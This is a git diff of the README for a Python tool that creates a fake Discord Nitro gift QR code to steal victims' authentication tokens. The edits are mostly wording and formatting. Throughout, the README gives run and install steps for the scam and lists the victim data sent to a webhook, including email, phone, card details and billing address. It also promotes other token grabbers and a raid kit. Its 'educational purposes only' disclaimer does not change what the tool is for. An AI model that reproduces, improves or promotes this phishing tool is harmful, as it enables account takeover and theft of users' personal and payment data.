@@ -16,10 +16,10 @@ A python script that generates a scam nitro QR code which can grab a victim's au
 
 *If you're interested in knowing the powerlevel configuration to get this prompt, have a look at [this repo](https://github.com/billythegoat356/pystyle).*
 
-![Capture d’écran 2022-08-27 172232](https://user-images.githubusercontent.com/38190847/187040712-92f4c796-c655-47a2-abb2-7f4519d1dab7.png)
+![Discord QR Token Grabber](https://user-images.githubusercontent.com/38190847/187040712-92f4c796-c655-47a2-abb2-7f4519d1dab7.png)
 
 <p align="center">
-<i>Loved the tool? Please consider <strong>donating</strong> 💸 to help it improve!</i>
+<i>Love the tool? Please consider <strong>donating</strong> 💸 to help it improve!</i>
 </p>
 
 <p align="center">
@@ -28,83 +28,83 @@ A python script that generates a scam nitro QR code which can grab a victim's au
 <a href="https://www.buymeacoffee.com/mouadessalim" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" height="30" width="115" style="border-radius:1px" />
 </p>
 
-## ❗Disclaimer
+## ❗ Disclaimer
 - **For Educational Purposes Only**
 - We decline any responsability in case of misuse of this code.
 
-# Table of contents
+# 📖 Table of contents
 
-- [Usage](#usage)
-  - [Without Discord features](#without-discord-features)
-  - [With Discord features](#with-discord-features)
-- [Installation](#installation)
+- [Usage](#-usage)
+  - [Without Discord features](#without-discord-webhook)
+  - [With Discord features](#with-discord-webhook)
+- [Installation](#-installation)
   - [Dependencies](#dependencies)
   - [Supported Platforms](#supported-platforms)
 - [Contributing](#contributing)
   - [Authors](#authors-)
-- [License](#license)
-- [Other Project](#others-projects)
+- [License](#-license)
+- [Other Project](#-other-projects)
 
-# 📈Usage
+# 📈 Usage
 
-To use the script, you just need to launch it normally without updating any code line ! The Qr-Code image sould appair named `discord_gift.png` in the current repository. However there is **2 way** to use the script :
+To use the script, run `install_requirements.bat` if needed, then run `main.py`. The scam image will appear as `discord_gift.png` in the directory. However there are two ways to use this script...
 
-- [Without Discord features](#with)
-- [With Discord features](#with-Discord-webhook-url)
+## Without Discord Webhook
 
-## Without Discord features
-
-Without discord features, you can only get target token, you must proceed as follows:
+Without a Discord Webhook, you can only get target token. You must enter `n` when prompted.
 
 <img src="https://user-images.githubusercontent.com/38190847/187074516-29a22055-96a0-40f9-9d79-8a69834ab039.png" width="500">
 
-## With Discord features
+## With Discord Webhook
 
-To use Discord features you will need to provide **webhook url** to prompt when requested:
+To use a Discord Webhook you must enter `y` when prompted.
 
 <img src="https://user-images.githubusercontent.com/38190847/187074586-d5c0a8f5-c96b-45bb-ac96-42550c2f1ae4.png" width="500">
 
-With this method you are able to get much more target information like:
+With a Discord Webhook, you will be able to get much more target information. The target information shown includes:
 
 - User token informations :
   - 👑 Username
+  - 🆔 User ID
   - 📧 Mail 
   - 📞 Phone 
   - 🤑 Nitro 
 - Payment info :
-  - 💳 Brand (Visa/Mastecard/paypal)
-  - ℹ/📩 Last 4 or paypal mail
+  - 💳 Brand (Visa / Mastecard / PayPal)
+  - ℹ/📩 Last 4 digits / PayPal mail
   - 📅 Expiration
 - Billing adress :
   - 📛 Name
-  - ⚡ Line 1
-  - ❄ Line 2
+  - 🏠 1️⃣ Address Line 1
+  - 🏠 2️⃣ Address Line 2
   - 🏳 Country
   - 🚩 State
   - 🏙 City
   - 📮 Postal code
 
-# 🛠Installation
+# 🛠 Installation
 
-For installation, you may need some requirements, You must follow these steps to avoid all python interpreter errors.
+For installation, there are a few requirements. You must follow these steps to avoid all python interpreter errors.
 
 ## Dependencies
 
-- Chrome, **be sure to have the lattest version**.
-- Python 9 or above
-- Python module (launch **install_requirements.bat**)
+- Chrome: **be sure to have the latest version**.
+- Python 3.9+
+- Python Modules (launch `install_requirements.bat`)
 
-After following all instructions, you can start the script 🥳.
+After installing all dependencies, you can start the script 🥳.
 
 ## Supported Platforms
-- Windows 11 `supported but not tested`
-- Windows 10 (also known as win32, for x86, x86_64, and arm64 architectures) `supported and tested`
-- Windows 8 `supported but not tested`
-- Windows 7 `supported but not tested`
+- Windows 11 - `supported but not tested`
+- Windows 10 - `supported and tested`
+- Windows 8 - `supported but not tested`
+- Windows 7 - `supported but not tested`
 
 # ✨Contributing
 
-Your contributions are always welcome! if you contribute we will show your account in the README file ! Please have a look at the [contribution guidelines](CONTRIBUTING.md) first. 🎉
+Your contributions are always welcome! If you contribute we will show your account in this README! 
+
+Please have a look at the [contribution guidelines](CONTRIBUTING.md) first. 🎉
 
 ## Authors ❤
 
@@ -116,14 +116,16 @@ Your contributions are always welcome! if you contribute we will show your accou
 
 > **Working on your first Pull Request?** You can learn how from this *free* series [How to Contribute to an Open Source Project on GitHub](https://kcd.im/pull-request)
 
-# 📝License
+# 📝 License
 
 The GNU General Public License v3.0 (GPL-3.0) 2022 - [mouadessalim](https://github.com/mouadessalim) & [9P9](https://github.com/9P9). Please have a look at the [LICENSE](LICENSE) for more details.
 
-# 💡Others projects
+# 💡 Other projects
 
 If you love this repository you may be interested in these projects:
 
 [![Readme Card](https://github-readme-stats.vercel.app/api/pin/?username=mouadessalim&repo=CookedGrabber&show_owner=true)](https://github.com/mouadessalim/CookedGrabber)
 
 [![Readme Card](https://github-readme-stats.vercel.app/api/pin/?username=9P9&repo=Website-Token-Grabber-2&show_owner=true)](https://github.com/9P9/Website-Token-Grabber-2)
+
+[![Readme Card](https://github-readme-stats.vercel.app/api/pin/?username=the-cult-of-integral&repo=discord-raidkit&show_owner=true)](https://github.com/9P9/Website-Token-Grabber-2)
